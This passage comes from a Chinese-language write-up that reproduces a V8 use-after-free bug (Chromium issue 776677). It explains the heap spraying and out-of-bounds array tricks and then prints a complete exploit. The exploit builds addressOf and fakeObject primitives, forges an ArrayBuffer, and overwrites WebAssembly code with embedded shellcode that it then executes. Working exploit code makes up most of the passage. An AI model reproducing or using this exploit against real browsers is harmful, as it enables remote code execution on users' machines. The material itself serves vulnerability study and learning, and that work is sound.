        return foo;
    }
    `
    eval(eval_str);
接下来就是搜索哪个被修改过的`Array`对象了
    //找到那个能够被我们UAF控制的Array
    var corrupted_array = undefined;
    for(var i = 0; i < victim_array.length; i++) {
        tmp = victim_array[i];
        if (tmp[0] !== 2.2) {
            console.log("[+] array at : " + i);
            corrupted_array = victim_array[i];
            break;
        }
    }
同时，我们得继续寻找该`Array`对象`Elements`后方的`Elements`属于哪个`Array`，其中注意到，由于`corrupted_array`的elements的length被我们修改成了0xFFFFFFFF，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组，这个特性也是新学到的。
    //寻找corrupted_array的后面是哪个Array对象的elements
    var next_array_idx = undefined;
    var tag = p64f(0x12345678,0x78563412)
    if (corrupted_array != undefined) {
        //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组
        corrupted_array.length = 0x200000;
        let leaked_idx = undefined;
        if (corrupted_array[0x20000] == 2.2) {
            corrupted_array[0x20000] = tag; //设置一个标记
            //搜索标记
            for(let i = 0; i < victim_array.length; i++) {
                tmp = victim_array[i];
                if (tmp[0] == tag) {
                    tmp = undefined;
                    console.log("[+] next array at : " + i);
                    next_array_idx = i;
                    break;
                }
            }
        }
    } else {
        console.log("[-] fail");
    }
我们搜索`next_array`的目的是为了将`next_array`进行释放。这样方便我们进行第二轮`Heap
Spray`，将其他对象布局到此处，然后用`corrupted_array`进行控制。
    function gc() {
       for (let i = 0; i < 0x10; i++) {
          new ArrayBuffer(0x1000000);
       }
    }
    //corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处
    victim_array[next_array_idx] = null;
    gc();
    //堆喷
    var obj = {};
    array = [obj];
    array.length = 0x2000;
    array.fill(obj);
    for(var i = 0;i < victim_array.length;i++){
       victim_array[i] = array.slice(0,array.length);
    }
这里，我们`victim_array[next_array_idx] = null;`使得该处对象失去了引用，然后通过申请大量的内存`new
ArrayBuffer(0x1000000);`触发了垃圾回收器将`next_array`的内存回收，这样`corrupted_array`后方的内存就空闲了，然后我们堆喷多个`HOLEY_ELEMENTS`类型的`Array`，因为该`Array`存储着的是对象的指针，因此，我们结合`corrupted_array`和该处的`Array`，就可以构造`addressOf`原语和`fakeObject`原语。其构造布置比较简单，这里不再叙述。然后后续利用也比较容易了。
###  exp
    function gc() {
       for (let i = 0; i < 0x10; i++) {
          new ArrayBuffer(0x1000000);
       }
    }
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return [dv.getUint32(0,true),dv.getUint32(4,true)];
    }
    //距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素
    let loop = "";
    for(let i = 0; i < 0xd0; i++) {
        loop += `fl[${0x21041 + 0x100 * i}] = x;fl[${0x21042 + 0x100 * i}] = x;`;
    }
    let eval_str = `
    function module(stdlib, foreign, buffer) {
        "use asm";
        var fl = new stdlib.Uint32Array(buffer);
        function foo(x) {
            x = x | 0;
            ${loop}
        }
        return foo;
    }
    `
    eval(eval_str);
    //堆喷
    var victim_array = [];
    victim_array.length = 0x750;
    var array = [1.1];
    array.length = 0x10000;
    array.fill(2.2);
    function spray_heap() {
        for(var i = 0;i < victim_array.length;i++){
            victim_array[i] = array.slice(0,array.length);
        }
    }
    var global = {Uint32Array:Uint32Array};
    var env = {};
    var memory = new WebAssembly.Memory({initial:200});
    var buffer = memory.buffer;
    var evil_f = module(global,env,buffer);
    evil_f(1);
    //%DebugPrint(memory);
    //%SystemBreak();
    //evil_f(1);
    //制造UAF
    memory.grow(1);
    //%DebugPrint(buffer);
    //重写对象的toString函数，这样在执行ToNumber时可以同时触发Hpeap Spray
    trigger = {};
    trigger.toString = function(){
        spray_heap();
        return 0xffffffff;
    };
    evil_f(trigger);
    //找到那个能够被我们UAF控制的Array
    var corrupted_array = undefined;
    for(var i = 0; i < victim_array.length; i++) {
        tmp = victim_array[i];
        if (tmp[0] !== 2.2) {
            console.log("[+] array at : " + i);
            corrupted_array = victim_array[i];
            break;
        }
    }
    //寻找corrupted_array的后面是哪个Array对象的elements
    var next_array_idx = undefined;
    var tag = p64f(0x12345678,0x78563412)
    if (corrupted_array != undefined) {
        //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组
        corrupted_array.length = 0x200000;
        let leaked_idx = undefined;
        if (corrupted_array[0x20000] == 2.2) {
            corrupted_array[0x20000] = tag; //设置一个标记
        //搜索标记
            for(let i = 0; i < victim_array.length; i++) {
                tmp = victim_array[i];
                if (tmp[0] == tag) {
                    tmp = undefined;
                    console.log("[+] next array at : " + i);
                    next_array_idx = i;
                    break;
                }
            }
        }
    } else {
        console.log("[-] fail");
    }
    //%DebugPrint(victim_array[next_array_idx]);
    //corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处
    victim_array[next_array_idx] = null;
    gc();
    //堆喷
    var obj = {};
    array = [obj];
    array.length = 0x2000;
    array.fill(obj);
    for(var i = 0;i < victim_array.length;i++){
       victim_array[i] = array.slice(0,array.length);
    }
    function addressOf(m_obj) {
       for(var i = 0;i < victim_array.length;i++){
          victim_array[i][0] = m_obj;
       }
       return u64f(corrupted_array[0x20000])[0] - 0x1;
    }
    var tag = {a:1.1};
    var tag_addr = addressOf(tag);
    //print("tag_addr=" + tag_addr.toString(16));
    //寻找corrupted_array后面是哪一个Array
    next_array_idx = undefined;
    corrupted_array[0x20001] = p64f(tag_addr+0x1,0x123456);
    //搜索标记
    for(let i = 0; i < victim_array.length; i++) {
       tmp = victim_array[i];
       if (tmp[2] == tag) {
          tmp = undefined;
          console.log("[+] next array at : " + i);
          next_array_idx = i;
          break;
       }
    }
    if (next_array_idx == undefined) {
       throw "error"
    }
    function fakeObject(addr) {
       corrupted_array[0x20000] = p64f(addr+0x1,0x123456);
       return victim_array[next_array_idx][0];
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([795371626, 1752379183, 1852400175, 23651209, 2164326657, 1769088052, 3375431937, 1493461585, 2303844609, 1792160225, 2160941067]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var wasm_shellcode_ptr_addr = addressOf(func) + 0x18;
    print('wasm_shellcode_ptr_addr=' + wasm_shellcode_ptr_addr.toString(16));
    var proto_addr = addressOf(ArrayBuffer.prototype);
    var faker = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var faker_addr = addressOf(faker);
    //fake a ArrayBuffer Map
    faker[0] = p64f(0,0x0f0a000a);
    faker[1] = p64f(0x000900c6,0x082003ff);
    faker[2] = p64f(proto_addr,0);
    var map_addr = faker_addr + 0x20;
    print("map_addr=" + map_addr.toString(16));
    //fake a ArrayBuffer
    faker[4] = p64f(map_addr+0x1,0x3b90412d);
    faker[5] = p64f(0x3b90412d,0x100);
    faker[6] = p64f(wasm_shellcode_ptr_addr,0);
    faker[7] = p64f(0x800,4);
    var fake_arr_buf = fakeObject(faker_addr + 0x40);
    var adv = new DataView(fake_arr_buf);
    var wasm_shellcode_addr = adv.getUint32(0,true) + 0x3f;
    print('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    faker[6] = p64f(wasm_shellcode_addr,wasm_shellcode_addr);
    //%SystemBreak();
    //替换wasm的shellcode
    for (var i=0;i<shellcode.length;i++) {
       adv.setUint32(i*4,shellcode[i],true);
    }
    //%SystemBreak();
    func();
## 0x04 感想
本次漏洞复现，学习了很多新知识，对于V8 UAF方面的漏洞还是第一次接触，结合`Heap Spray`也是第一次，收获比较大。
## 0x05 参考
[asm.js：面向未来的开发](https://blog.csdn.net/code_for_free/article/details/53674210)  
[asm.js 和 Emscripten
入门教程](http://www.ruanyifeng.com/blog/2017/09/asmjs_emscripten.html)  
[Issue 776677: Security: V8:Use After Free Leads to Remote Code
Execution](https://bugs.chromium.org/p/chromium/issues/detail?id=776677)